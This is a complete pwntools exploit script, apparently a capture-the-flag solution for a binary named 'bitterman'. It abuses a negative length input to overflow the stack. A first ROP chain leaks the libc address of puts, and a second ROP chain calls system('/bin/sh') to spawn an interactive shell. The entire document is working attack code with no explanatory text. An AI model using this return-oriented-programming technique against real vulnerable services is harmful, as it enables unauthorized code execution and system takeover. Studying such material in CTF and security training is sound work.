from pwn import *
junk = b'A'*152
context(arch='amd64', os='linux')
#p = gdb.debug('./bitterman', 'b main')
p = process('./bitterman')
# First stage leak puts address
e = ELF('./bitterman')
p.recvuntil(b"> What\'s your name? \n")
p.sendline(b'pippo')
p.recvuntil(b'> Please input the length of your message: \n')
p.sendline(b'-1')
p.recvuntil(b'> Please enter your text: \n')
r_bitterman = ROP(e)
r_bitterman.puts(e.got['puts'])
r_bitterman.call(e.symbols['main'])
print(r_bitterman.dump())
p.sendline(junk + r_bitterman.chain())
p.recvuntil(b'> Thanks!\n')
leaked_puts = u64(p.recvline()[:-1].ljust(8,b'\x00'))
print(hex(leaked_puts))

# Getting a shell
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_puts_offset = 0x84420
libc_base_address = leaked_puts - libc_puts_offset
libc.address = libc_base_address
p.recvuntil(b"> What\'s your name? \n")
p.sendline(b'pippo')
p.recvuntil(b'> Please input the length of your message: \n')
p.sendline(b'-1')
p.recvuntil(b'> Please enter your text: \n')
r_bitterman = ROP(libc)
ret_empty = r_bitterman.find_gadget(['ret'])[0]
r_bitterman.system(next(libc.search(b'/bin/sh')))
print(r_bitterman.dump())
p.sendline(junk + p64(ret_empty) + r_bitterman.chain())
p.recvuntil(b'> Thanks!\n')
p.interactive()